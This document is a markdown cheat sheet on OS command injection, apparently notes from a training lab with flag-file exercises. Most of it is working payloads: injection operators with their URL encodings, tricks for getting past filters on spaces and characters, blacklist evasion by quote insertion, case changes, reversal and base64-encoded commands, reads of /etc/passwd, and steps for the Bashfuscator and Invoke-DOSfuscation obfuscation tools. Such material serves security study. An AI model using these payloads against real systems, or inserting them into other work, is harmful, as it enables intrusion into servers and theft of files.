A web application written in PHP may use the **exec, system, shell_exec, passthru, or popen functions** to execute commands directly on the back-end server
NodeJS, a developer may use **child_process.exec or child_process.spawn** for the same purpose.

## Bypass Front-End validation
127.0.0.1;whoami <br />
127.0.0.1; ls


## Injection Operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
|-|-|-|-|
|Semicolon| `;`|`%3b`|Both|
|New Line| `\n`|`%0a`|Both|
|Background| `&`|`%26`|Both (second output generally shown first)|
|Pipe| `\|`|`%7c`|Both (only second output is shown)|
|AND| `&&`|`%26%26`|Both (only if first succeeds)|
|OR| `\|\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell| ` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell| `$()`|`%24%28%29`|Both (Linux-only)|

## Injection Filter

| Injection Type                          | Operators                           |
| --------------------------------------- | ----------------------------------- |
| SQL Injection                           | ' , ; -- /\* \*/                    |
| Command Injection                       | ; &&                                |
| LDAP Injection                          | \* ( ) & |                          |
| XPath Injection                         | ' or and not substring concat count |
| OS Command Injection                    | ; & |                               |
| Code Injection                          | ' ; -- /\* \*/ $() ${} #{} %{} ^    |
| Directory Traversal/File Path Traversal | ../ ..\\\\ %00                      |
| Object Injection                        | ; & |                               |
| XQuery Injection                        | ' ; -- /\* \*/                      |
| Shellcode Injection                     | \\x \\u %u %n                       |
| Header Injection                        | \\n \\r\\n \\t %0d %0a %09          |

---
# Linux

## Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `printenv` | Can be used to view all environment variables |
| **Spaces** |
| `%0a` | New-Line |
| `%0a%09` | New-Line tab |
| `%09` | Using tabs instead of spaces |
| `${IFS}` | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}` | Commas will be replaced with spaces |
| `127.0.0.1%0a${IFS} -> 127.0.0.1%0a${ls,-la} -> 127.0.0.1%0a{ls,-la}` | Changing and bypass |
| **Other Characters** |
| `${PATH:0:1}` | Will be replaced with `/` |
| `${LS_COLORS:10:1}` | Will be replaced with `;` |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`) |
| `ip=127.0.0.1${LS_COLORS:10:1}${IFS}` | Successfully bypassed the other blacklisted characters filter |
| `ip=127.0.0.1%0als${IFS}${PATH:0:1}home` | List /home file |

---
## Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `$@` or `\` | Linux only |
| `ip=127.0.0.1%0awho$@ami` | Linux only |
| `ip=127.0.0.1%0aw\ho\am\i` | Linux only |
| `127.0.0.1%0aw'h'o'am'i` | Linux and Windows |
| `127.0.0.1%0awho^ami` |  Windows |
| `ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt` |  Linux read /home/flag.txt file |
| **Case Manipulation** |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Execute command regardless of cases / doesnt work standalone |
|`ip=127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")` | Once we replace the spaces with tabs (%09), we see that the command works perfectly |
| `$(a="WhOaMi";printf %s "${a,,}")` | Another variation of the technique |
| **Reversed Commands** |
| `echo 'whoami' \| rev` | Reverse a string |
| `ip=127.0.0.1%0a$(rev<<<'imaohw')` | Execute reversed command (already added %0a) |
| **Encoded Commands** |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode a string with base64 |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string |
  **Note that we are using <<< to avoid using a pipe \|, which is a filtered character** |TIP  |
| `echo -n whoami \| iconv -f utf-8 -t utf-16le \| base64` | Convert the string from utf-8 to utf-16 before we base64 |
**Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ \| grep root \| grep mysql \| tail -n 1** | Question|
| `echo -n 'find /usr/share/ \| grep root \| grep mysql \| tail -n 1 ' \| base64` | Convert the string from utf-8 to utf-16 before we base64 |
| `ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEg` | The value we got |
| `at the end add %09 between base64 and -d` | Add %09 |
| `127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEg)` | Final Solution |



---
# Windows

## Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `Get-ChildItem Env:` | Can be used to view all environment variables - (PowerShell) |
| **Spaces** |
| `%09` | Using tabs instead of spaces |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD) |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell) |
| **Other Characters** |
| `%HOMEPATH:~0,-17%` | Will be replaced with `\` - (CMD) |
| `$env:HOMEPATH[0]` | Will be replaced with `\` - (PowerShell) |


---
## Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `^` | Windows only (CMD) |
| **Case Manipulation** |
| `WhoAmi` | Simply send the character with odd cases |
| **Reversed Commands** |
| `"whoami"[-1..-20] -join ''` | Reverse a string |
| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command |
| **Encoded Commands** |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with base64 |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string |


## Linux tool

| Code | Description |
| ----- | ----- |
| `https://github.com/Bashfuscator/Bashfuscator` | Linux | 

git clone https://github.com/Bashfuscator/Bashfuscator <br />
cd Bashfuscator <br />
pip3 install setuptools==65 <br /> 
python3 setup.py install --user <br />
cd ./bashfuscator/bin/ <br />
./bashfuscator -h <br />
./bashfuscator -c 'cat /etc/passwd' <br />
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 <br />
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"' <br />

## Windows tool

| Code | Description |
| ----- | ----- |
| `https://github.com/danielbohannon/Invoke-DOSfuscation` | Windows |

git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git <br />
cd Invoke-DOSfuscation <br />
Import-Module .\Invoke-DOSfuscation.psd1 <br />
Invoke-DOSfuscation <br />
Invoke-DOSfuscation> help <br />
Invoke-DOSfuscation> SET COMMAND type C:\Users\student\Desktop\flag.txt <br />
Invoke-DOSfuscation> encoding <br />
Invoke-DOSfuscation\Encoding> 1 <br />
Result: typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt <br />
C:\Users> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt


